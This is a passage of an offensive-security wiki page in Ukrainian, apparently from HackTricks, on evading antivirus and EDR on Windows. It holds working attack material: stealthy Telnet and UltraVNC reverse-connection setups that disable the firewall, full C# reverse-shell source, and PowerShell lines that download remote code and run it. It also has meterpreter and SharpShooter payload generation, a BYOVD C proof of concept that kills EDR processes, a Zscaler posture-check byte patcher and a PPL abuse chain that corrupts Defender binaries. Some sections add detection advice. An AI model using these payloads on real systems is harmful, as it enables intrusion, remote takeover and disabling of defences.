Кожне середовище матиме свої сильні та слабкі сторони.

Рекомендую переглянути цей доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарника** поки не **виявить, яка саме частина Defender** вважає шкідливою, та вкаже її.\
Інший інструмент, який робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритим вебом, що надає сервіс на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з можливістю встановлення **Telnet server**, який можна було інсталювати (як адміністратор) виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** при запуску системи та **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (прихований) та вимкнути брандмауер:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажити звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin-завантаження, не setup)

**ON THE HOST**: Запустіть _**winvnc.exe**_ та налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ та **щойно** створений файл _**UltraVNC.ini**_ всередину **victim**

#### **Reverse connection**

The **attacker** має **виконати всередині** свого **host** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** перехопити зворотне **VNC connection**. Потім, всередині **victim**: запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

УВАГА: Щоб зберегти прихованість, не потрібно робити кілька речей

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). перевірте, чи він працює командою `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажити звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **start the lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компіляція нашого власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using компілятор
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для прикладу створення injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використав невелику консольну утиліту, відому як **Antivirus Terminator**, щоб відключити захист кінцевих точок перед розгортанням ransomware. Інструмент постачає власний **вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій в ядрі, які не можуть бути заблоковані навіть AV-сервісами, що працюють як Protected-Process-Light (PPL).

Ключові висновки
1. **Підписаний драйвер**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — це легітимно підписаний драйвер `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли увімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як ядерну службу, а другий запускає її, завдяки чому `\\.\ServiceMouse` стає доступним з користувацького простору.
3. **IOCTLи, які експонуються драйвером**
| IOCTL code | Можливість                             |
|-----------:|----------------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для вбивства Defender/EDR сервісів) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Розвантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить захист у user-mode; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або маніпулювати об’єктами ядра незалежно від PPL/PP, ELAM чи інших механізмів захисту.

Виявлення / пом'якшення
•  Увімкніть список блокування вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Моніторте створення нових *kernel* сервісів і сповіщайте, коли драйвер завантажується з директорії з правами запису для всіх або коли його немає в allow-list.
•  Слідкуйте за дескрипторами в user-mode до кастомних device-об’єктів, за якими слідують підозрілі виклики `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує правила перевірки стану пристрою локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі проєктні рішення роблять повний обхід можливим:

1. Оцінка стану виконується **повністю на клієнті** (на сервер відправляється булеве значення).
2. Внутрішні RPC-ендпоінти лише перевіряють, що підключаючийся виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Змінюючи **чотири підписані бінарні файли на диску**, обидва механізми можна нейтралізувати:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається пройденою |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть неподписаний) процес може підключитися до RPC-пайпів |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Пропущено |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів та перезапуску стеку сервісів:

* **Всі** перевірки стану показують **зелений/відповідає вимогам**.
* Не підписані або змінені бінарні файли можуть відкривати RPC-ендпоїнти через іменований pipe (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як виключно клієнтські рішення щодо довіри та прості перевірки підпису можна обійти кількома патчами байтів.

## Зловживання Protected Process Light (PPL) для маніпулювання AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувача/рівня, так що лише захищені процеси з рівнем не нижче можуть втручатися один в одного. Зловмисно, якщо ви можете легітимно запустити бінарник із підтримкою PPL та контролювати його аргументи, ви можете перетворити безпечну функціональність (наприклад, логування) у обмежений примітив запису, підкріплений PPL, проти захищених директорій, які використовуються AV/EDR.

Що змушує процес працювати як PPL
- Цільовий EXE (та будь-які завантажені DLL) має бути підписаний з EKU, сумісним з PPL.
- Процес має бути створений за допомогою CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запрошено сумісний рівень захисту, який відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Відкритий інструмент: CreateProcessAsPPL (вибирає рівень захисту та пересилає аргументи до цільового EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Схема використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN примітив: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог-файлу у шлях, вказаний викликачем.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не можете контролювати вміст, який записує ClipUp, окрім розміщення; примітива підходить для пошкодження, а не для точного інжектування вмісту.
- Вимагає локального admin/SYSTEM для встановлення/запуску служби та вікна перезавантаження.
- Час виконання критичний: ціль не повинна бути відкритою; виконання під час завантаження уникає блокувань файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківський процес — нестандартний засіб запуску, навколо часу завантаження.
- Нові служби, налаштовані на автостарт підозрілих бінарних файлів і які стабільно запускаються до Defender/AV. Розслідуйте створення/зміну служби перед помилками запуску Defender.
- Моніторинг цілісності файлів у директоріях бінарників Defender/Platform; несподівані створення/зміни файлів процесами з прапорцями protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL непов'язаними з AV бінарними файлами.

Mitigations
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і під якими батьківськими процесами; блокувати виклик ClipUp поза легітимними контекстами.
- Service hygiene: обмежте створення/зміну служб з автостартом та моніторьте маніпуляції порядком запуску.
- Переконайтесь, що Defender tamper protection та ранні захисні механізми запуску увімкнені; розслідуйте помилки запуску, які вказують на корупцію бінарних файлів.
- Розгляньте відключення генерації коротких імен 8.3 на томах, що містять security tooling, якщо це сумісно з вашим середовищем (ретельно тестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Посилання

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
